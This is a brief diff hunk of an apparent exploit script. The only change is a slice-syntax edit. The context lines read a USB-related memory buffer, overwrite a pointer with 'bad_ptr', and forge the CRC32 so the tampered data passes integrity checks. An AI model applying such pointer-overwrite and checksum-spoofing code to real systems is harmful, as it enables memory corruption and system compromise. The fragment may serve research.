@@ -57,7 +57,7 @@ buffer = mem_read(usb_data + 0x70, buf_size)
 crc32 = get_buffer_crc32(buffer)
 
 # replace the pointer (usb_data + 0x78)
-buffer = buffer[0:8] + pack('<Q', bad_ptr)
+buffer = buffer[:8] + pack('<Q', bad_ptr)
 
 # spoof crc32, first 4 bytes will be modified
 buffer = modify_buffer_crc32(buffer, 0, crc32)
